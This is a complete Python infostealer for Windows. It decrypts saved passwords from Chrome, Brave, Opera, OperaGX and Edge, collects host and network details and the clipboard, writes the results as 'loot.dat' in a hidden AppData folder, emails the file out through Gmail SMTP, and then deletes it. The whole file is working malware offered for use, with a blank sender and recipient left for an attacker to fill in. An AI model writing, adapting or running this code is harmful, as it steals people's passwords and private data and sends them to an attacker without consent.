import os
import json
import base64
import shutil
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import pyperclip
import platform
import socket
import re
import uuid
import requests
import smtplib
from email.message import EmailMessage


# === PLACEHOLDERS: Set these before use! ===
SENDER_EMAIL = ""
APP_PASSWORD = ""  # Make sure this is your valid Gmail App Password
RECIPIENT_EMAIL = ""
# ===========================================


class BrowserToolkit:
    def __init__(self):
        self.browser_paths = self.get_all_browser_paths()

    def get_all_browser_paths(self):
        user_dir = os.environ['USERPROFILE']
        return {
            "Chrome":   (os.path.join(user_dir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data'), "chromium"),
            "Brave":    (os.path.join(user_dir, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'), "chromium"),
            "Opera":    (os.path.join(user_dir, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'), "opera"),
            "OperaGX":  (os.path.join(user_dir, 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable'), "operagx"),
            "Edge":     (os.path.join(user_dir, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'), "chromium"),
        }

    def find_profiles(self, base_path, kind="chromium"):
        profiles = []
        if kind in ("opera", "operagx") and os.path.isdir(base_path):
            profiles.append(base_path)
            return profiles
        if os.path.isdir(base_path):
            for name in os.listdir(base_path):
                p = os.path.join(base_path, name)
                if os.path.isdir(p) and (name == 'Default' or name.startswith('Profile')):
                    profiles.append(p)
        return profiles

    def get_decryption_key(self, local_state_path):
        try:
            if not os.path.exists(local_state_path):
                return None
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            return None

    def decrypt_password(self, buff, key):
        try:
            if not buff:
                return None
            if buff.startswith(b'v20'):
                return 'v20_not_supported'
            if buff.startswith(b'v10') or buff.startswith(b'v11'):
                iv = buff[3:15]
                payload = buff[15:]
                tag = payload[-16:]
                encrypted_password = payload[:-16]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt_and_verify(encrypted_password, tag).decode()
            else:
                return CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception:
            return None

    def extract_browser_passwords(self, filter_browser=None):
        credentials = []
        failed = []
        browsers = self.browser_paths
        for browser_name, (browser_path, kind) in browsers.items():
            if filter_browser and browser_name != filter_browser:
                continue
            profiles = self.find_profiles(browser_path, kind)
            for profile_path in profiles:
                if kind in ("opera", "operagx"):
                    local_state_path = os.path.join(profile_path, "Local State")
                    login_db_path = os.path.join(profile_path, "Login Data")
                    profile_label = "(Opera profile)"
                else:
                    local_state_path = os.path.join(browser_path, "Local State")
                    login_db_path = os.path.join(profile_path, "Login Data")
                    profile_label = os.path.basename(profile_path)
                if not os.path.exists(local_state_path):
                    continue
                key = self.get_decryption_key(local_state_path)
                if not key or not os.path.exists(login_db_path):
                    continue
                temp_copy = "LoginDataTemp.db"
                try:
                    shutil.copy2(login_db_path, temp_copy)
                    conn = sqlite3.connect(temp_copy)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, pwd in cursor.fetchall():
                        password = self.decrypt_password(pwd, key)
                        if password == 'v20_not_supported':
                            failed.append({
                                "browser": browser_name,
                                "profile": profile_label,
                                "url": url,
                                "username": user,
                                "reason": "v20 encryption format not supported (cannot decrypt)"
                            })
                        elif password:
                            credentials.append({
                                "browser": browser_name,
                                "profile": profile_label,
                                "url": url,
                                "username": user,
                                "password": password
                            })
                    cursor.close()
                    conn.close()
                except Exception:
                    pass
                finally:
                    if os.path.exists(temp_copy):
                        os.remove(temp_copy)
        return credentials, failed


def send_email_with_attachment(sender, app_password, recipient, file_path):
    msg = EmailMessage()
    msg["Subject"] = "Browser loot"
    msg["From"] = sender
    msg["To"] = recipient
    msg.set_content("Attached is the requested extracted data.\n")

    with open(file_path, "rb") as f:
        data = f.read()
        msg.add_attachment(data, maintype="application", subtype="octet-stream", filename=os.path.basename(file_path))

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(sender, app_password)
        smtp.send_message(msg)



def main():
    toolkit = BrowserToolkit()

    # Gather all data
    creds, failed = toolkit.extract_browser_passwords()

    # System info
    system_info_lines = []
    try:
        info = {
            'platform': platform.system(),
            'platform-release': platform.release(),
            'platform-version': platform.version(),
            'architecture': platform.machine(),
            'hostname': socket.gethostname(),
            'ip-address': socket.gethostbyname(socket.gethostname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor(),
        }
        try:
            response = requests.get('https://api.ipify.org?format=json')
            global_ip = response.json().get('ip', 'N/A')
            info['global-ip-address'] = global_ip
        except Exception:
            info['global-ip-address'] = 'Could not fetch global IP address'

        for key, value in info.items():
            system_info_lines.append(f"{key}: {value}")
    except Exception:
        system_info_lines.append("Error capturing system info.")

    # Clipboard
    try:
        clipboard_content = pyperclip.paste()
    except Exception:
        clipboard_content = "Could not access clipboard."

    # Prepare report text
    report = []
    report.append("===== Browser Credentials =====")
    for cred in creds:
        report.append("=" * 40)
        report.extend(f"{k}: {v}" for k, v in cred.items())
        report.append("=" * 40)
    for cred in failed:
        report.append("=" * 40)
        report.append("WARNING: Could not decrypt password!")
        report.extend(f"{k}: {v}" for k, v in cred.items())
        report.append("=" * 40)

    report.append("===== System Information =====")
    report.extend(system_info_lines)

    report.append("===== Clipboard Content =====")
    report.append(str(clipboard_content))

    # Create hidden directory inside user AppData\Local
    user_dir = os.environ['USERPROFILE']
    hidden_folder = os.path.join(user_dir, 'AppData', 'Local', 'SysDataHidden')
    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
        # Set hidden attribute on Windows
        import ctypes
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, FILE_ATTRIBUTE_HIDDEN)

    # Save loot.dat inside hidden folder
    data_filename = os.path.join(hidden_folder, "loot.dat")
    with open(data_filename, "w", encoding="utf-8") as f:
        f.write('\n'.join(report))

    # Email the file
    send_email_with_attachment(SENDER_EMAIL, APP_PASSWORD, RECIPIENT_EMAIL, data_filename)

    # Delete the loot.dat file after sending email
    os.remove(data_filename)
    
if __name__ == "__main__":
 main()
